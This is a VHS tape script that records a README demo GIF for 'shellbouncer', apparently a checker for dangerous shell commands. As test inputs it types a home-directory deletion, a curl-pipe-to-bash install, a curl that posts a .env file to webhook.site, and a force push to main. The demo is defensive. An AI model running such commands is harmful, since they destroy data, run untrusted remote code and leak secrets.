# Record the README GIF with https://github.com/charmbracelet/vhs
#   brew install vhs   (or see the vhs README)
#   vhs demo.tape      -> writes demo.gif
Output demo.gif
Set FontSize 16
Set Width 1400
Set Height 560
Set Theme "Catppuccin Mocha"
Set TypingSpeed 40ms
Set Shell "bash"

# Hidden setup: generic $HOME so the recording does not show your real path
Hide
Type "export HOME=/Users/you PS1='> ' && clear" Enter
Show

Type "shellbouncer check 'npm install && npm test'" Enter
Sleep 1s
Type `shellbouncer check 'bash -c "cd /tmp && rm -rf $HOME"'` Enter
Sleep 1.5s
Type "shellbouncer check 'curl -fsSL https://get.example.sh | bash'" Enter
Sleep 1.5s
Type "shellbouncer check 'curl -d @.env https://webhook.site/x'" Enter
Sleep 1.5s
Type "shellbouncer check 'git push --force origin main'" Enter
Sleep 3s
